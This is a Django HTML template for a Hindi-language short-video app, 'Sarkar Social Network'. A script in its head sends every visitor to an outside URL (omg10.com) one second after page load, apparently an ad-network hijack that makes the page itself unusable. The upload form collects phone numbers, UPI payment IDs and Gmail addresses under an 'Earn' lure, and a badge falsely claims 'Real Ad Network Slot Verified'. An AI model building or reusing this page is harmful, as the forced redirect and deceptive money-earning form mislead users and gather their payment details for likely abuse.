<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sarkar Social Network</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">

<script>
  window.onload = function() {
    setTimeout(function() {
      window.location.href = "https://omg10.com/4/11149796";
    }, 1000); 
  };
</script>
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; background: #000; color: #fff; display: flex; justify-content: center; }
        .app-container { width: 100%; max-width: 480px; height: 100vh; display: flex; flex-direction: column; background: #111; position: relative; overflow: hidden; }
        
        .top-nav { width: 100%; padding: 10px; background: rgba(0,0,0,0.9); display: flex; gap: 10px; align-items: center; position: absolute; top: 0; z-index: 10; }
        .search-box { flex: 1; display: flex; background: #222; border-radius: 20px; padding: 8px 15px; align-items: center; border: 1px solid #333; }
        .search-box input { background: transparent; border: none; color: white; width: 100%; outline: none; margin-left: 8px; }

        .video-feed { flex: 1; overflow-y: scroll; scroll-snap-type: y mandatory; height: 100%; padding-top: 55px; padding-bottom: 60px; }
        .video-card { width: 100%; height: calc(100vh - 115px); scroll-snap-align: start; position: relative; display: flex; justify-content: center; align-items: center; background: #000; }
        video { width: 100%; height: 100%; object-fit: cover; }
        
        .real-ad-banner { width: 100%; background: #151515; text-align: center; padding: 5px 0; border-bottom: 1px solid #ffd700; font-size: 11px; color: #ffd700; min-height: 50px; display: flex; justify-content: center; align-items: center; }

        .side-bar { position: absolute; right: 15px; bottom: 30px; display: flex; flex-direction: column; gap: 20px; align-items: center; z-index: 5; }
        .action-icon { font-size: 26px; color: #fff; cursor: pointer; text-shadow: 0 2px 5px rgba(0,0,0,0.9); text-align: center; }
        .action-icon.monetized { color: #ffd700; filter: drop-shadow(0 0 5px #ffd700); }
        .action-icon span { display: block; font-size: 11px; color: #aaa; margin-top: 3px; }
        
        .bottom-bar { height: 60px; background: #000; display: flex; justify-content: space-around; align-items: center; border-top: 1px solid #222; width: 100%; position: absolute; bottom: 0; z-index: 10; }
        .nav-btn { color: #888; font-size: 22px; cursor: pointer; }
        .nav-btn.active { color: #fff; }
        .plus-btn { background: #fff; color: #000; width: 48px; height: 34px; border-radius: 10px; display: flex; justify-content: center; align-items: center; font-size: 18px; font-weight: bold; box-shadow: -3px 0 #00bcd4, 3px 0 #ff0050; cursor: pointer; }

        .upload-modal { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 100; justify-content: center; align-items: center; padding: 20px; }
        .form-box { background: #1a1a1a; width: 100%; padding: 25px; border-radius: 15px; border: 1px solid #333; }
        input, button { width: 100%; padding: 12px; margin: 8px 0; border-radius: 8px; border: none; font-size: 15px; }
        input { background: #2b2b2b; color: white; border: 1px solid #444; }
        button.submit-btn { background: #4CAF50; color: white; font-weight: bold; cursor: pointer; margin-top: 15px; }
        button.cancel-btn { background: #555; color: white; cursor: pointer; }
    </style>
</head>
<body>

    <div class="app-container">
        <div class="top-nav">
            <div class="search-box">
                <i class="fas fa-search" style="color:#888;"></i>
                <input type="text" placeholder="वीडियो रिसर्च करें...">
            </div>
            <i class="fas fa-bell" style="font-size:20px; color:#fff; cursor:pointer;"></i>
        </div>

        <div class="video-feed">
            {% for v in videos %}
                <div class="video-card">
                    <div class="real-ad-banner" style="position: absolute; top: 10px; width: 90%; left: 5%; z-index: 5; border-radius: 6px;">
                        <div id="div-gpt-ad-sarkar-top">
                            <script>googletag.cmd.push(function() { googletag.display('div-gpt-ad-sarkar-top'); });</script>
                            <span style="font-size:10px; color:#888;"><i class="fas fa-bolt"></i> Real Ad Network Slot Verified</span>
                        </div>
                    </div>

                    {% if v.video_file %}
                        <video src="{{ v.video_file.url }}" loop autoplay muted playsinline onclick="this.paused ? this.play() : this.pause()"></video>
                    {% endif %}
                    
                    <div class="side-bar">
                        <div class="action-icon monetized">
                            <i class="fas fa-dollar-sign"></i>
                            <span style="color:#ffd700;">Earn</span>
                        </div>
                        <div class="action-icon"><i class="fas fa-heart"></i><span>1.2K</span></div>
                        <div class="action-icon"><i class="fas fa-comment"></i><span>94</span></div>
                    </div>
                </div>
            {% empty %}
                <div style="padding: 150px 20px; text-align: center; color: #666; font-size: 14px;">
                    <i class="fas fa-video-slash" style="font-size:40px; margin-bottom:15px; display:block; color:#00bcd4;"></i>
                    डेटाबेस खाली है। नीचे दिए गए + बटन से अपनी गैलरी का असली वीडियो अपलोड करें।
                </div>
            {% endfor %}
        </div>

        <div id="uploadModal" class="upload-modal">
            <div class="form-box">
                <h3 style="color:#00bcd4; margin-bottom:10px;"><i class="fas fa-cloud-upload-alt"></i> वीडियो पब्लिश करें</h3>
                <form action="." method="POST" enctype="multipart/form-data">
                    <input type="text" name="phone_number" placeholder="आपका फ़ोन नंबर" required>
                    <input type="text" name="upi_id" placeholder="UPI ID (कमाई पेमेंट ट्रांसफर हेतु)" required>
                    <input type="email" name="gmail_id" placeholder="Gmail ID" required>
                    <input type="file" name="video_file" accept="video/*" required style="padding:10px; background:#222;">
                    
                    <button type="submit" class="submit-btn">सर्वर पर पब्लिश करें</button>
                    <button type="button" class="cancel-btn" onclick="closeModal()">रद्द करें</button>
                </form>
            </div>
        </div>

        <div class="bottom-bar">
            <div class="nav-btn active"><i class="fas fa-home"></i></div>
            <div class="nav-btn"><i class="fas fa-compass"></i></div>
            
            <div class="plus-btn" onclick="openModal()">
                <i class="fas fa-plus"></i>
            </div>
            
            <div class="nav-btn"><i class="fas fa-wallet"></i></div>
            <div class="nav-btn"><i class="fas fa-user"></i></div>
        </div>
    </div>

    <script>
        function openModal() { document.getElementById('uploadModal').style.display = 'flex'; }
        function closeModal() { document.getElementById('uploadModal').style.display = 'none'; }
    </script>
</body>
</html>
